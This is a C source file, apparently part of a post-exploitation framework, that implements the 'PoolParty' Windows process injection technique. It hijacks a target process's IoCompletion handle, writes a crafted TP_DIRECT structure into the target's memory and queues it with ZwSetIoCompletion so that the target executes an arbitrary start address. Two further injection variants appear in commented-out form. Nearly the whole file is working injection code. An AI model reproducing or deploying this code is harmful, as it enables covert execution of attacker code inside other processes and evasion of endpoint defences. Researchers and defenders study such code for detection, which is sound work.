#include "common.h"
#include "pool_party.h"
#include "pool_party_ext.h"

pNtDll *ntdll = NULL;
POOLPARTY_INJECTOR* poolLifeguard = NULL;

pNtDll* GetOrInitNtDll() {
	BOOL bError = FALSE;
	HANDLE hHeap = GetProcessHeap();
	bError = (hHeap == NULL);

	if (ntdll != NULL) {
		return ntdll;
	}

	if (!bError) {
		ntdll = (pNtDll*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(pNtDll));
		bError = ntdll == NULL;
		if (!bError) {
			HMODULE hNtDll = LoadLibraryA("ntdll.dll");
			ntdll->pNtQueryInformationProcess = (NTSTATUS(NTAPI*)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryInformationProcess");
			ntdll->pNtQueryObject = (NTSTATUS(NTAPI*)(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryObject");
			dprintf("[INJECT][inject_via_poolparty][ntdll_init] NtQueryInformationProcess: %p NtQueryObject: %p", ntdll->pNtQueryInformationProcess, ntdll->pNtQueryObject);
			
			ntdll->pZwSetIoCompletion = (NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, NTSTATUS, ULONG_PTR))GetProcAddress(hNtDll, "ZwSetIoCompletion");
			if (ntdll->pZwSetIoCompletion != NULL) {
				if (poolLifeguard != NULL) {
					poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].isSystemSupported = TRUE;
				}
			}
			dprintf("[INJECT][inject_via_poolparty][ntdll_init] ZwSetIoCompletion: %p", ntdll->pZwSetIoCompletion);

			//ntdll->pZwAssociateWaitCompletionPacket = (NTSTATUS(NTAPI*)(HANDLE, HANDLE, HANDLE, PVOID, PVOID, NTSTATUS, ULONG_PTR, PBOOLEAN))GetProcAddress(hNtDll, "ZwAssociateWaitCompletionPacket");
			//if (ntdll->pZwAssociateWaitCompletionPacket != NULL) {
			//	if (poolLifeguard != NULL) {
			//		poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_WAIT_INSERTION].isSystemSupported = TRUE;
			//	}
			//}
			//dprintf("[INJECT][inject_via_poolparty][ntdll_init] ZwAssociateWaitCompletionPacket: %p", ntdll->pZwAssociateWaitCompletionPacket);

			//ntdll->pNtQueryInformationWorkerFactory = (NTSTATUS(NTAPI*)(HANDLE, _WORKERFACTORYINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryInformationWorkerFactory"); // WIN 7
			//dprintf("[INJECT][inject_via_poolparty][ntdll_init] NtQueryInformationWorkerFactory: %p", ntdll->pNtQueryInformationWorkerFactory);

			//ntdll->pNtSetInformationWorkerFactory = (NTSTATUS(NTAPI*)(HANDLE, _WORKERFACTORYINFOCLASS, PVOID, ULONG))GetProcAddress(hNtDll, "NtSetInformationWorkerFactory"); // WIN7
			//dprintf("[INJECT][inject_via_poolparty][ntdll_init] NtSetInformationWorkerFactory: %p", ntdll->pNtSetInformationWorkerFactory);

			//if (ntdll->pNtQueryInformationWorkerFactory != NULL && ntdll->pNtSetInformationWorkerFactory != NULL) {
			//	if (poolLifeguard != NULL) {
			//		poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].isSystemSupported = TRUE;
			//	}
			//}
		}
	}
	return ntdll;
}

POOLPARTY_INJECTOR* GetOrInitPoolParty(DWORD dwSourceArch, DWORD dwDestinationArch) {
	BOOL bError = FALSE;
	HANDLE hHeap = GetProcessHeap();
	bError = (hHeap == NULL);
	BOOL isWow64;
	IsWow64Process(GetCurrentProcess(), &isWow64);

	if (poolLifeguard != NULL) {
		return poolLifeguard;
	}

	if (!bError) {
		poolLifeguard = (POOLPARTY_INJECTOR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(POOLPARTY_INJECTOR));
		bError = poolLifeguard == NULL;
		
		if(!bError) {
			poolLifeguard->init = FALSE;
			if (ntdll == NULL) {
				bError = GetOrInitNtDll() == NULL;
			}
		}

		if (!bError) {
			if (dwSourceArch == PROCESS_ARCH_X64) {
				if (dwDestinationArch == PROCESS_ARCH_X64) {
					// poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_WAIT_INSERTION].isInjectionSupported = poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_WAIT_INSERTION].isSystemSupported;
				}
				poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].isInjectionSupported = poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].isSystemSupported;
			}
		}

		if (!bError) {
			poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].handler = remote_tp_direct_insertion;
			// poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_WAIT_INSERTION].handler = remote_tp_wait_insertion;
			// poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].handler = worker_factory_start_routine_overwrite;
			poolLifeguard->init = TRUE;
		}
	}

	if (bError && poolLifeguard != NULL) {
		HeapFree(hHeap, 0, poolLifeguard);
		poolLifeguard = NULL;
	}
	return poolLifeguard;
};

// For now we support only Windows 10 x64 -> Windows 10 x64
BOOL supports_poolparty_injection(DWORD dwSourceArch, DWORD dwDestinationArch) {
	OSVERSIONINFO os = { 0 };
	BOOL isWow64;
	IsWow64Process(GetCurrentProcess(), &isWow64);
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	NTSTATUS(*pRtlGetVersion)(OSVERSIONINFO * os) = (NTSTATUS(*)(OSVERSIONINFO * os)) GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
	dprintf("[INJECT][supports_poolparty_injection] RtlGetVersion: %p", pRtlGetVersion);
	if (!pRtlGetVersion(&os)) {
		dprintf("[INJECT][supports_poolparty_injection] dwSourceArch: %d dwDestinationArch: %d isWow64: %d", dwSourceArch, dwDestinationArch, isWow64);
		dprintf("[INJECT][supports_poolparty_injection] os.dwMajorVersion: %d os.dwMinorVersion: %d", os.dwMajorVersion, os.dwMinorVersion);
		if (os.dwMajorVersion >= 10) {
			if (dwDestinationArch == dwSourceArch && dwSourceArch == PROCESS_ARCH_X64) {
				return TRUE;
			}
		}
	}
	return FALSE;
}

HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess) {
	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
	ULONG dwInformationSizeIn = 2048;
	ULONG dwInformationSizeOut = 0;
	HANDLE hCurrProcess = GetCurrentProcess();
	HANDLE hHeap = GetProcessHeap();
	PPROCESS_HANDLE_SNAPSHOT_INFORMATION lpProcessInfo = NULL;
	PPUBLIC_OBJECT_TYPE_INFORMATION lpObjectInfo = NULL;
	pNtDll* ntDll = GetOrInitNtDll();

	DWORD ntStatus = 0;
	lpProcessInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpProcessInfo: %p", lpProcessInfo);

	while (TRUE) {
		ntStatus = ntdll->pNtQueryInformationProcess(hProcess, ProcessHandleInformation, lpProcessInfo, dwInformationSizeIn, &dwInformationSizeOut);
		dprintf("[INJECT][inject_via_poolparty][get_remote_handle] NtQueryInformationProcess() : %p", ntStatus);
		if (ntStatus == 0xC0000004L && dwInformationSizeIn != dwInformationSizeOut) {
			lpProcessInfo = HeapReAlloc(hHeap, 0, lpProcessInfo, dwInformationSizeOut);
			dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapReAlloc lpProcessInfo: %p", lpProcessInfo);
			dwInformationSizeIn = dwInformationSizeOut;
			continue;
		}
		if (ntStatus != 0 && ntStatus != 0xC0000004L) {
			HeapFree(hHeap, 0, lpProcessInfo);
			return INVALID_HANDLE_VALUE;
		}
		if (ntStatus == 0) {
			break;
		}
	}
	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpProcessInfo: %p dwInformationSizeIn: %d", lpProcessInfo, dwInformationSizeIn);
	dwInformationSizeIn = 2048;
	dwInformationSizeOut = 0;
	lpObjectInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpObjectInfo: %p", lpObjectInfo);
	for (ULONG i = 0; i < lpProcessInfo->NumberOfHandles; i++) {
		if (DuplicateHandle(hProcess, lpProcessInfo->Handles[i].HandleValue, hCurrProcess, &hHijackHandle, dwDesiredAccess, FALSE, 0)) {
			ntDll->pNtQueryObject(hHijackHandle, ObjectTypeInformation, lpObjectInfo, dwInformationSizeIn, &dwInformationSizeOut);
			if (dwInformationSizeIn > dwInformationSizeOut) {
				if (lstrcmpW(typeName, lpObjectInfo->TypeName.Buffer) == 0) {
					break;
				}
			}
			CloseHandle(hHijackHandle);
		}
		hHijackHandle = INVALID_HANDLE_VALUE;
	}
	HeapFree(hHeap, 0, lpObjectInfo);
	HeapFree(hHeap, 0, lpProcessInfo);
	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] hHijackHandle: %p", hHijackHandle);
	return hHijackHandle;
}

DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTriggerEvent) {
	BOOL bError = FALSE;
	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
	ULONG dwInformationSizeIn = 1;
	ULONG dwInformationSizeOut = 0;
	pNtDll* ntDll = NULL;
	DWORD dwResult = ERROR_POOLPARTY_GENERIC;
	HANDLE hHeap = GetProcessHeap();
	DWORD dwDirectSize = dwDestinationArch == PROCESS_ARCH_X64 ? TP_DIRECT_STRUCT_SIZE_X64 : TP_DIRECT_STRUCT_SIZE_X86;

	LPVOID *Direct = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwDirectSize);
	do {
		ntDll = GetOrInitNtDll();
		if (ntdll == NULL) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Cannot GetOrInitNtDll()", ERROR_POOLPARTY_GENERIC);
		}
		if (!poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION].isInjectionSupported) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] This variant is not supported in this system.", ERROR_POOLPARTY_VARIANT_FAILED)
		}
		hHijackHandle = GetRemoteHandle(hProcess, L"IoCompletion", IO_COMPLETION_ALL_ACCESS);

		if (hHijackHandle == INVALID_HANDLE_VALUE) {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to locate IoCompletion object inside the target process.", ERROR_POOLPARTY_VARIANT_FAILED)
		}

		if (hHijackHandle != INVALID_HANDLE_VALUE) {

			if (dwDestinationArch == PROCESS_ARCH_X64) {
				*(QWORD*)((BYTE*)Direct + TP_DIRECT_STRUCT_CB_OFFSET_X64) = (QWORD) lpStartAddress;
			}
			if (dwDestinationArch == PROCESS_ARCH_X86) {
				*(DWORD*)((BYTE*)Direct + TP_DIRECT_STRUCT_CB_OFFSET_X86 - 4) = (DWORD) PtrToPtr32(lpStartAddress);
			}
			LPVOID RemoteDirectAddress = VirtualAllocEx(hProcess, NULL, dwDirectSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			if (!RemoteDirectAddress) {
				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to allocate RemoteDirectAddress.", ERROR_POOLPARTY_VARIANT_FAILED)
			}
			if (!WriteProcessMemory(hProcess, RemoteDirectAddress, Direct, dwDirectSize, NULL)) {
				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to write target process memory.", ERROR_POOLPARTY_VARIANT_FAILED)
			}
			dwResult = ntDll->pZwSetIoCompletion(hHijackHandle, RemoteDirectAddress, lpParameter, 0, 0);
			dprintf("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] ZwSetIoCompletion: %d", dwResult);
			dwResult = 0;
		}
	} while (0);
	return dwResult;
}

//DWORD remote_tp_wait_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTriggerHandle) {
//	BOOL bError = FALSE;
//	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
//	ULONG dwInformationSizeIn = 1;
//	ULONG dwInformationSizeOut = 0;
//	pNtDll* ntDll = NULL;
//	DWORD dwResult = ERROR_POOLPARTY_GENERIC;
//	HANDLE hHeap = GetProcessHeap();
//	POOLPARTY_INJECTOR* pLifeguard = NULL;
//	HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
//	do {
//		ntDll = GetOrInitNtDll();
//		if (ntDll == NULL) {
//			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] Cannot init GetOrInitNtDll()", ERROR_POOLPARTY_GENERIC);
//		}
//		if (!poolLifeguard->variants[POOLPARTY_TECHNIQUE_TP_WAIT_INSERTION].isInjectionSupported) {
//			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] This variant is not supported in this system.", ERROR_POOLPARTY_VARIANT_FAILED)
//		}
//		hHijackHandle = GetRemoteHandle(hProcess, L"IoCompletion", IO_COMPLETION_ALL_ACCESS);
//
//		if (hHijackHandle == INVALID_HANDLE_VALUE) {
//			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_wait_insertion] Unable to locate IoCompletion object inside the target process.", ERROR_POOLPARTY_VARIANT_FAILED)
//		}
//
//		if (hHijackHandle != INVALID_HANDLE_VALUE) {
//			PFULL_TP_WAIT hThreadPool = (PFULL_TP_WAIT)CreateThreadpoolWait((PTP_WAIT_CALLBACK)(lpStartAddress), lpParameter, NULL);
//			PFULL_TP_WAIT pRemoteTpWait = VirtualAllocEx(hProcess, NULL, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//			WriteProcessMemory(hProcess, pRemoteTpWait, hThreadPool, sizeof(FULL_TP_WAIT), NULL);
//
//			PTP_DIRECT pRemoteTpDirect = VirtualAllocEx(hProcess, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//			WriteProcessMemory(hProcess, pRemoteTpDirect, &hThreadPool->Direct, sizeof(TP_DIRECT), NULL);
//			ntDll->pZwAssociateWaitCompletionPacket(hThreadPool->WaitPkt, hHijackHandle, hEvent, pRemoteTpDirect, pRemoteTpWait, 0, 0, NULL);
//			SetEvent(hEvent);
//			dwResult = 0;
//		}
//	} while (0);
//	return dwResult;
//}

//DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTriggerEvent) {
//	BOOL bError = FALSE;
//	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
//	ULONG dwInformationSizeIn = 1;
//	ULONG dwInformationSizeOut = 0;
//	pNtDll* ntDll = NULL;
//	DWORD dwResult = ERROR_POOLPARTY_GENERIC;
//	HANDLE hHeap = GetProcessHeap();
//	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
//	do {
//		ntDll = GetOrInitNtDll();
//		if (ntdll == NULL) {
//			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] Cannot GetOrInitNtDll()", ERROR_POOLPARTY_GENERIC);
//		}
//		if (poolLifeguard->variants[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE].isInjectionSupported) {
//			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] This variant is not supported in this system.", ERROR_POOLPARTY_VARIANT_FAILED)
//		}
//		hHijackHandle = GetRemoteHandle(hProcess, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS);
//
//		if (hHijackHandle == INVALID_HANDLE_VALUE) {
//			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] Unable to locate IoCompletion object inside the target process.", ERROR_POOLPARTY_VARIANT_FAILED)
//		}
//
//		if (hHijackHandle != INVALID_HANDLE_VALUE) {
//			ntdll->pNtQueryInformationWorkerFactory(hHijackHandle, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
//
//			ULONG WorkerFactoryMinimumThreadNumber = WorkerFactoryInformation.TotalWorkerCount + 1;
//			dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WorkerFactoryInformation.StartRoutine: %ull", WorkerFactoryInformation.StartRoutine);
//			ntdll->pNtSetInformationWorkerFactory(hHijackHandle, WorkerFactoryThreadMinimum, &WorkerFactoryMinimumThreadNumber, sizeof(ULONG));
//		}
//	} while (0);
//	return dwResult;
//}
//

